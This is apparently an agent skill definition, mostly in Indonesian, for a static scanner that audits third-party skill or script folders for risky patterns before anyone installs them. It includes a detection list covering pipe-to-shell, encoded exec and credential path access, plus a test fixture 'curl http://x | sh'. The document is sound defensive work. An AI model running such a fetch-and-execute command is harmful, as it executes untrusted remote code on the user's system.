---
name: third-party-skill-audit
description: Statically scan a third-party skill, script, or plugin folder for high-risk patterns (remote pipe-to-shell, encoded exec, credential path access, shell profile edits, unpinned installs, binaries, symlinks) before anyone runs or installs it. Use whenever the user wants to adopt a skill or script from an external GitHub repository.
license: original-zy
compatibility: Python 3.9+ standard library only
metadata: {"category": "governance", "status": "verified", "owner": "zy"}
---

# Third-Party Skill Audit

## Activation Triggers
- User ingin memasang skill, plugin, atau script dari repository atau sumber luar.
- User menyebut "audit", "cek keamanan skill", atau "apakah script ini aman".
- Sebelum menyalin folder pihak ketiga ke dalam library ZY.

## Scope dan Batas Kemampuan
- Dicakup: pemindaian statis pola berisiko, daftar URL eksternal, file biner, symlink, dan file tersembunyi.
- TIDAK dicakup: analisis dinamis (sandbox), verifikasi tanda tangan, audit dependensi transitif, analisis kode berbahasa lain yang tidak terpola, dan deteksi malware canggih.
- Hasil "tidak ada temuan" BUKAN bukti aman. Ini hanya berarti tidak ada pola yang dikenali.

## Required Tools
- Python 3.9+.
- `scripts/scan_skill_risk.py`.
- Akses baca ke folder target. Script tidak pernah mengeksekusi isi file.

## Input dan Output Specification
Input: path direktori (folder skill yang sudah diunduh ke folder karantina, mis. scratchpad).
Output: daftar temuan `[SEVERITY] rule file:line :: snippet`, atau JSON dengan `--json`.
Exit code: 0 tanpa HIGH, 1 ada HIGH, 2 error input.

## Execution Workflow
1. Unduh/clone sumber ke direktori karantina baru yang kosong (bukan ke library).
2. Baca manual `SKILL.md`/README dan daftar file. Catat lisensi.
3. Jalankan `python scripts/scan_skill_risk.py <folder> --json > hasil.json`.
4. Tinjau semua HIGH secara manual; tinjau MEDIUM yang relevan dengan tujuan skill.
5. Untuk URL eksternal (LOW), pastikan tujuannya dikenal dan wajar.
6. Putuskan: adopsi (dengan catatan), adopsi sebagian (tulis ulang), atau tolak. Dokumentasikan di `research/`.
7. Hanya setelah keputusan adopsi, salin ke library, dan jalankan validator.

## Decision Rules
- Ada HIGH: jangan jalankan dan jangan salin tanpa tinjauan manual yang jelas. Laporkan ke user.
- Hanya MEDIUM: tinjau; bila fungsi memang perlu (mis. subprocess), tulis ulang dengan argumen list dan tanpa shell=True.
- Lisensi copyleft (GPL/AGPL): jangan salin kode; tulis ulang metode dan catat sumber.
- Lisensi tidak jelas (tanpa file LICENSE): anggap tidak boleh disalin; referensikan saja.
- Jangan pernah menjalankan `curl | sh`, installer, atau `pip install` dari skill pihak ketiga tanpa persetujuan user.

## Error Handling
- Path bukan direktori: error exit 2.
- File tidak bisa dibaca: dilaporkan sebagai error OS (dipropagasi).
- File non-UTF-8 terdeteksi: dilaporkan MEDIUM untuk ditinjau manual.

## Quality Control
- Verifikasi scanner dengan fixture yang sengaja berisi pola berbahaya (di test) untuk memastikan deteksi berjalan.
- Pastikan folder `.git` tidak ikut dipindai sebagai konten skill.
- Catat versi/commit sumber yang diaudit.

## Acceptance Criteria
- Fixture `curl http://x | sh` menghasilkan HIGH `pipe-remote-to-shell`.
- Fixture bersih menghasilkan nol temuan HIGH.
- Symlink dan binary ELF/PE terdeteksi.
- Exit code 1 bila ada HIGH.

## Contoh Implementasi
```bash
python scripts/scan_skill_risk.py /path/to/karantina/skill-x
python scripts/scan_skill_risk.py /path/to/karantina/skill-x --json > audit-skill-x.json
```

## Test Cases
Lihat `tests/test_scan_skill_risk.py`:
1. Pipe remote ke shell -> HIGH.
2. `os.system` dan `shell=True` -> MEDIUM.
3. Direktori bersih -> tanpa HIGH.
4. Binary ELF -> HIGH.
5. Path invalid -> exit 2.

## Referensi dan Sumber
- Prinsip "no execution of untrusted third-party scripts before inspection" dari Global Governance ZY.
- Lihat `references/audit-checklist.md`.

## Informasi Lisensi
- Scanner dan dokumen: `original-zy`. Tidak menyalin aturan dari alat pihak ketiga.
